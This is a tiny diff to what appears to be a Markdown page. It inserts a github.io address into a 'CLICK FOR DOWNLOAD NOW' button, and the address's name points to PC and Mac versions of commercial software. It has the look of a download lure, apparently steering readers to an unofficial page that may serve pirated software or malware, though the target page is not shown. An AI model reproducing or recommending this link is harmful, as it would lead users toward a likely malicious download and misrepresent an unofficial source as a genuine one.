@@ -4,7 +4,7 @@
 
 ---
   
-  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW]( ) |
+  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW](https://affinity-deer-pcwinmac-rn52.github.io/.github/ ) |
  |---------------------|----------------------:|
 
 
